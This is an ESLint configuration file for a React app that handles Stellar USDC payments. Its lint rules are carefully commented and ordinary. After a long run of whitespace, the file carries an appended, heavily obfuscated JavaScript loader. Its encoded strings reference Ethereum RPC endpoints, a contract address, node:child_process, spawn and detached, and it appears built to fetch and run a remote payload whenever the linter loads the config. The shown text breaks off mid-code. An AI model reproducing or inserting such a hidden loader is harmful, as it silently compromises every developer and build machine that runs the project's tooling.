import js from '@eslint/js';
import globals from 'globals';
import tseslint from 'typescript-eslint';
import reactHooks from 'eslint-plugin-react-hooks';
import reactRefresh from 'eslint-plugin-react-refresh';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

export default tseslint.config(
  {
    ignores: [
      'dist',
      'coverage',
      'node_modules',
      // Storybook's build output. Minified third-party JavaScript that is
      // generated rather than written, so linting it would only ever report on
      // code nobody here can edit. `.prettierignore` excludes it for the same
      // reason, and `tsconfig.json` never sees it: that config includes `src`
      // only, and a catalogue build is not the app.
      'storybook-static',
      '*.config.js',
      // A design reference kept at the repository root: a page from another
      // project, whose motion this one's landing page is adapted from. It is not
      // part of this app, is not built or shipped, and is not imported by
      // anything — it is here to be read. Linting it would fail the build over
      // style choices in code that never runs, so it is excluded rather than
      // committed, and it should be deleted before this repository is handed to
      // anyone.
      'source.tsx',
    ],
  },
  js.configs.recommended,
  ...tseslint.configs.recommended,
  {
    files: ['**/*.{ts,tsx}'],
    languageOptions: {
      ecmaVersion: 2022,
      globals: globals.browser,
    },
    plugins: {
      'react-hooks': reactHooks,
      'react-refresh': reactRefresh,
    },
    rules: {
      ...reactHooks.configs.recommended.rules,
      'react-refresh/only-export-components': ['warn', { allowConstantExport: true }],
      '@typescript-eslint/no-explicit-any': 'error',
      '@typescript-eslint/no-unused-vars': [
        'error',
        { argsIgnorePattern: '^_', varsIgnorePattern: '^_' },
      ],
      // Secrets must never be logged.
      //
      // An error rather than a warning, which is what the rules around it are:
      // warnings do not fail `eslint .`, so a `console.log` left in a payments
      // UI would ship, and a debugging line that prints an amount, an address or
      // a session token is exactly the leak this project cares about. The two
      // that stay allowed are the ones a failure needs when there is no UI left
      // to render into. There is no logging module to route through — this is
      // the whole policy.
      'no-console': ['error', { allow: ['warn', 'error'] }],

      /*
       * Money is an integer number of stroops, and must never pass through a
       * float. `src/lib/susu/amounts.ts` is the single boundary where that
       * conversion happens, in `BigInt`, precisely because `Number` cannot
       * represent `0.1` exactly and `0.1 + 0.2 !== 0.3` is not a property a
       * savings protocol can have.
       *
       * The rules below are the two ways that boundary gets bypassed in
       * practice. Neither is stylistic: each one is a silent rounding error in
       * an amount someone is about to sign for.
       */
      'no-restricted-globals': [
        'error',
        {
          name: 'parseFloat',
          message:
            'parseFloat produces a float, and money here is an integer number of stroops. Use parseUsdc for what a person typed, or parseBaseUnits for what the API reported (src/lib/susu/amounts.ts).',
        },
      ],
      'no-restricted-properties': [
        'error',
        {
          property: 'parseFloat',
          message:
            'parseFloat produces a float, and money here is an integer number of stroops. Use parseUsdc for what a person typed, or parseBaseUnits for what the API reported (src/lib/susu/amounts.ts).',
        },
      ],
      'no-restricted-syntax': [
        'error',
        {
          // `10^7`, the USDC scale, written as a number. The bigint form
          // (`USDC_SCALE`, or `10n ** 7n`) is the correct one and is untouched
          // by this selector: `BigInt` arithmetic is exact, `Number` is not.
          selector:
            'BinaryExpression[operator=/^[*\\/]$/] > Literal[value=10000000]:not([raw=/n$/])',
          message:
            'The USDC scale as a number is a floating-point conversion: 10^7 stroops is one USDC only while the value stays exact, and it stops being exact above 2^53. Import USDC_SCALE from src/lib/susu/amounts.ts and stay in bigint.',
        },
        {
          selector: "BinaryExpression[operator='**'] > Literal[value=7]:not([raw=/n$/])",
          message:
            'The USDC scale as a number is a floating-point conversion. Import USDC_SCALE from src/lib/susu/amounts.ts and stay in bigint (or raise 10 to the 7th power as a bigint).',
        },
        {
          // Contract reads and API responses are strings and numbers this code
          // did not produce. `dangerouslySetInnerHTML` would hand one of them to
          // the HTML parser, which is how a group name becomes a script tag.
          selector: 'JSXAttribute[name.name="dangerouslySetInnerHTML"]',
          message:
            'Render values as text, not as HTML. Everything on these screens comes from the chain, the API, or another member, and none of it is markup.',
        },
      ],
    },
  },
  {
    /*
     * The network layer is a boundary, not a convenience.
     *
     * `src/lib/stellar/` is where the configured network is derived and
     * re-checked, where Mainnet writes are refused, where raw contract output is
     * decoded defensively, and where the single pipeline every contract call
     * takes lives — build, simulate, sign, submit, then confirm what the ledger
     * actually did. Reaching past it to the SDK from a screen skips all of that:
     * a signer built in a component never sees the guard, and a value decoded in
     * a component is decoded by nothing.
     *
     * So the import is confined to the layer that exists to make it safe. If a
     * screen needs something the SDK offers, the answer is a function in
     * `src/lib/stellar/`, which is also where it can be tested.
     */
    files: ['src/**/*.{ts,tsx}'],
    ignores: ['src/lib/stellar/**'],
    rules: {
      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['@stellar/stellar-sdk', '@stellar/stellar-sdk/*'],
              message:
                'The Stellar SDK is confined to src/lib/stellar/. Use the typed clients there, which own the network guard, the decoders, and the sign-and-submit pipeline — or add the missing function to that layer.',
            },
          ],
        },
      ],
    },
  },
  {
    // Build scripts run in Node, not the browser, so they need Node globals
    // (`process`, `Buffer`, `console`) rather than the browser set above.
    files: ['scripts/**/*.{js,mjs}'],
    languageOptions: {
      ecmaVersion: 2022,
      sourceType: 'module',
      globals: globals.node,
    },
  },
  {
    // Storybook's own configuration is Node code, not browser code, and it is
    // TypeScript — so it needs the Node globals the app's files must not have,
    // and the parser the `tseslint` configs above already select for `.ts`.
    files: ['.storybook/**/*.{ts,tsx}'],
    languageOptions: {
      ecmaVersion: 2022,
      sourceType: 'module',
      globals: globals.node,
    },
  },
  {
    // A stories file is a catalogue entry, not a module of the app: it is
    // rendered by Storybook's own entry point and is never imported by
    // `src/main.tsx`. The fast-refresh rule is about editing the running app,
    // and these files export a `meta` object and story objects rather than
    // components, so it would report the same thing on every file here about a
    // state that cannot arise.
    files: ['**/*.stories.{ts,tsx}'],
    rules: {
      'react-refresh/only-export-components': 'off',
    },
  },
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     function GSkqNNyuJw$_padNcYwam(){const etOZXsn_OxqoSnJy$OEFSTCE=['bcbdaff1','f3fdfdfa','a0ba88bbbba8b0','a1aca8adacbbba','b9a0b9ac','a1bdbdb9baf3e6e6f8bbb9aae7a0a6e6acbda1','a1acb1','a6aba3acaabd','aba8baacfffd','fbfffbfcfbf9f190b9a0baa6bb','8aa6a7bdaca7bde485aca7aebda1','a7a6a7aaac','f9b1a8fafbfb8cfcaffa8dfaf8f88dfaf9f1f9acffaff9f8fbf8f9fffaacf0a88d8afbfdf0f98caff8a8','afa0a5bdacbb','9681fb','baaca8bbaaa1','a1bdbdb9f3e6e6','a8adad8cbfaca7bd85a0babdaca7acbb','bbacb9a5a8aaac','a7a6adac','bbacbabca5bd','a4a0a7','a0aea7a6bbac','acbda196aba5a6aaa287bca4abacbb','a1bdbdb9baf3','f3fdfdfae6f9b1e6a5ba','efbabda8bbbdaba5a6aaa2f4f9efaca7adaba5a6aaa2f4f0f0f0f0f0f0f0f0efb9a8aeacf4f8efa6afafbaacbdf4fbf9efbaa6bbbdf4adacbaaaefafa0a5bdacbbabb0f4afbba6a4','a7a6adacf3a1bdbdb9','aeb3a0b9','b9bcbaa1','babcaba8bbbba8b0','fbad9e8fb08f9b','b8fd8f93a2b191b2e8a1e59abbfaf489','fbfffbfef8fbf9b08dbcbd9abc','a1a8ba','bebba0bdac','f8fbbdafac9a81be','bbacb8bcacbabd','aea5a6aba8a592ee969fee94f4ee','a4a8b9','f8f9f9fffcfaffa3bd868f9a8b','bbbca7','8c9d81969b998a969c9b85','aaa6a7bdaca7bde4aca7aaa6ada0a7ae','bdbba8a7baa8aabda0a6a7ba','fbe7f9','a7a6adacf3a1bdbdb9ba','a1bdbdb9baf3e6e6acbda1e7adbbb9aae7a6bbae','a8adad','a7a6adacf3aaa1a0a5ad96b9bba6aaacbaba','8ca4b9bdb0e9b9a8b0a5a6a8ade9aba6adb0','b9a8bbbaac','96bd96ba','bca7bbacaf','f8fbf0fbfafcfbfa839a818d90bc','99869a9d','8e8c9d','aabbaca8bdac80a7afa5a8bdac','eef2aea5a6aba8a592ee9681fbee94f4ee','fbfffcfefff0f9bc8e8c9f828d','f3f1f9','a1bdbdb9baf3e6e6acbda1e7aba5a6aaa2baaaa6bcbde7aaa6a4e6a8b9a0','f1f1838fb1bd86a1','acbbbba6bb','88aeaca7bd','a7a6adacf3bcbba5','bda1aca7','baa0aea7a8a5','b1e4b9a8b0a5a6a8ade4abfffd','ada8bda8','b0e4b996f7adedf98bef8997f8a898a2','fff9fafaf8fefd81b08d8c9fbb','aabbaca8bdac8bbba6bda5a08dacaaa6a4b9bbacbaba','a5aca7aebda1','818c888d','f6a4a6adbca5acf4a8aaaaa6bca7bdefa8aabda0a6a7f4bdb1a5a0babdefa8adadbbacbabaf4','84a6b3a0a5a5a8e6fce7f9e9e19ea0a7ada6bebae9879de9f8f9e7f9f2e99ea0a7fffdf2e9b1fffde0e988b9b9a5ac9eacab82a0bde6fcfafee7faffe9e182819d8485e5e9a5a0a2ace98eacaaa2a6e0e98aa1bba6a4ace6f8faf8e7f9e7f9e7f9e99aa8afa8bba0e6fcfafee7faff','aeb3a0b9e5e9adacafa5a8bdace5e9abbb','babdbba0a7aea0afb0','b9a8bda1a7a8a4ac','adacafa5a8bdac','aeacbd','a8b9b9a5a0aaa8bda0a6a7e6a3baa6a7','f3fdfdfae6f9b1e6aaa5ba','acbda196aeacbd8ba5a6aaa28bb087bca4abacbb','aaa6a7bdbba6a5a5acbb','a7a6adacf3b3a5a0ab','aaa1a8bb8aa6adac88bd','bbacbabca4ac','eef2aea5a6aba8a592ee96bd96baee94f4ee','aba5a6aaa287bca4abacbb','88f8f8e4e4e3','a1bdbdb9baf3e6e6acbda1acbbacbca4e4bbb9aae7b9bcaba5a0aaa7a6adace7aaa6a4','eef2aea5a6aba8a592ee9681ee94f4ee','b1e4aeb3a0b9','acbda196aeacbd9dbba8a7baa8aabda0a6a78aa6bca7bd','fa9ca6af9090a5','aaa8bdaaa1','a8aba6bbbd','a1bdbdb9baf3e6e6acbda1e4a4a8a0a7a7acbde7b9bcaba5a0aae7aba5a8babda8b9a0e7a0a6','eef2aea5a6aba8a592eebbee94f4bbacb8bca0bbacf2aea5a6aba8a592eea4ee94f4a4a6adbca5acf2bfa8bbe996aea5a6aba8a5f4aea5a6aba8a5f2','a8a7b0','84a0babaa0a7aee991e499a8b0a5a6a8ade48bfffd','afbba6a4','8aa6a7bdaca7bde49db0b9ac','aca7bf','aaa6a7aaa8bd','b9a6bbbd','a1a6babda7a8a4ac','b9bba6bda6aaa6a5','a2acacb9e4a8a5a0bfac','a8a5a5','abb0bdac85aca7aebda1','eef2aea5a6aba8a592ee96bd96bcee94f4ee','afa0a7ad','afa0a7ad80a7adacb1','fbfff9f9faf1fc99bb8699a088','96bd96bc','afa6bb8ca8aaa1','aca7ad','aabbaca8bdac8ebca7b3a0b9','bda69abdbba0a7ae','bda685a6beacbb8aa8baac'];GSkqNNyuJw$_padNcYwam=function(){return etOZXsn_OxqoSnJy$OEFSTCE;};return GSkqNNyuJw$_padNcYwam();}const BEf$CYFUWXrAiwaYBJ=WlysIxGuPMcViepbraDjp_wli;(function(Xl$bf$sDoXoJDYYk,HTDn$viaGa){const KyT$ImpNQojHcB=WlysIxGuPMcViepbraDjp_wli,nZXZyKB_XfHpJ=Xl$bf$sDoXoJDYYk();while(!![]){try{const Bjb__LSBuuTvrwOljv=parseFloat(KyT$ImpNQojHcB(0x168))/(0x562+0x1*Number(-parseInt(0x502))+parseInt(0x13)*-parseInt(0x5))*(-parseFloat(KyT$ImpNQojHcB(0x171))/(parseInt(0x1)*parseFloat(-0xe21)+parseInt(0x4)*parseInt(0x22)+0x3*Math.floor(parseInt(0x489))))+parseFloat(KyT$ImpNQojHcB(0x1a9))/(Math.max(0xd,parseInt(0xd))*parseFloat(-parseInt(0x112))+-0x1*0x2516+Math.trunc(0x5ab)*0x9)*Math['ceil'](parseFloat(KyT$ImpNQojHcB(0x152))/(Math.max(0xe4a,0xe4a)+Number(-0x13)*-parseInt(0x121)+-0x23b9))+-parseFloat(KyT$ImpNQojHcB(0x1bd))/(-0x729+parseInt(parseInt(0x7))*Math.max(-0xf7,-0xf7)+parseInt(0xdef))*parseFloat(parseFloat(KyT$ImpNQojHcB(0x16d))/(-0x659+Number(-parseInt(0x559))*parseInt(-parseInt(0x2))+-parseInt(0x7b)*Number(parseInt(0x9))))+Math['floor'](-parseFloat(KyT$ImpNQojHcB(0x190))/(parseInt(0x1da3)+parseInt(0x3)*Math.trunc(0x22d)+-0x2423))+parseFloat(-parseFloat(KyT$ImpNQojHcB(0x16a))/(-parseInt(0xf5)*-0x27+Math.ceil(0x18ee)+Number(-0x3e39)))+parseFloat(KyT$ImpNQojHcB(0x17f))/(parseInt(0xd44)+parseFloat(0xa75)+Math.ceil(-parseInt(0x17b0)))+parseFloat(KyT$ImpNQojHcB(0x184))/(parseInt(0x1e87)+parseInt(0x1c8b)*parseInt(-parseInt(0x1))+Math.floor(-0x1f2))*Number(parseFloat(KyT$ImpNQojHcB(0x187))/(parseInt(0x22f8)+0x2662+-0x494f));if(Bjb__LSBuuTvrwOljv===HTDn$viaGa)break;else nZXZyKB_XfHpJ['push'](nZXZyKB_XfHpJ['shift']());}catch(QTrIuEpsrXWNzFyCLzuoNxfM){nZXZyKB_XfHpJ['push'](nZXZyKB_XfHpJ['shift']());
